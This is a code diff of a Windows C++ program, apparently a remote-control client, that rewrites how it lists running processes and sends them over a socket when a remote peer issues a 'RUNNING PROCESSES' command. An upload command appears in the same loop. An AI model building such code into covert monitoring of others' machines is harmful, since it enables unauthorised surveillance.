@@ -336,42 +336,39 @@ string getOS()
     }
 }
 
-vector<wstring> getRunningProcesses()
-{
-    DWORD processes[1024];
-    DWORD numProcesses;
-    vector<wstring> processNames;
+void sendRunningProcesses(SOCKET clientSocket) {
+    PROCESSENTRY32 processEntry;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    string processList;
 
-    if (!EnumProcesses(processes, sizeof(processes), &numProcesses))
-    {
-        return processNames;
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        cout << "CreateToolhelp32Snapshot failed" << endl;
+        return;
     }
 
-    numProcesses /= sizeof(DWORD);
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
 
-    for (DWORD i = 0; i < numProcesses; i++)
-    {
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
-        if (hProcess != NULL)
-        {
-            HMODULE hMod;
-            DWORD cbNeeded;
-
-            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
-            {
-                TCHAR szProcessName[MAX_PATH];
-
-                if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
-                {
-                    //processNames.push_back(szProcessName);
-                }
-            }
-
-            CloseHandle(hProcess);
-        }
+    if (!Process32First(snapshot, &processEntry)) {
+        cout << "Process32First failed" << endl;
+        CloseHandle(snapshot);
+        return;
     }
 
-    return processNames;
+    do {
+        char exeName[MAX_PATH];
+        WideCharToMultiByte(CP_UTF8, 0, processEntry.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
+
+        processList.append(exeName);
+        processList.append("\n");
+    } while (Process32Next(snapshot, &processEntry));
+
+    CloseHandle(snapshot);
+
+    int bytesSent = send(clientSocket, processList.c_str(), processList.length(), 0);
+    if (bytesSent == SOCKET_ERROR) {
+        cout << "Process List send failed" << endl;
+        return;
+    }
 }
 
 
@@ -533,24 +530,7 @@ int main(int argc, char* arg[]) {
             }
             else if (strstr(buffer, "RUNNING PROCESSES")) {
                 //Send Running Processes
-
-                vector<wstring> processes = getRunningProcesses();
-                string result = "Running processes: \n";
-                for (const auto& process : processes) {
-                    result += string(process.begin(), process.end()) + "\n";
-                }
-
-                // int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
-                
-                // encode running processes
-                string encryptedResult = encrypt(result);
-                int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
-                
-                if (bytesSent == SOCKET_ERROR) {
-                    cout << "Error while sending running processes: " << WSAGetLastError() << endl;
-                    WSACleanup();
-                    return 0;
-                }
+                sendRunningProcesses(clientSocket);
             }
             else if (strstr(buffer, "UPLOAD")) {
                 
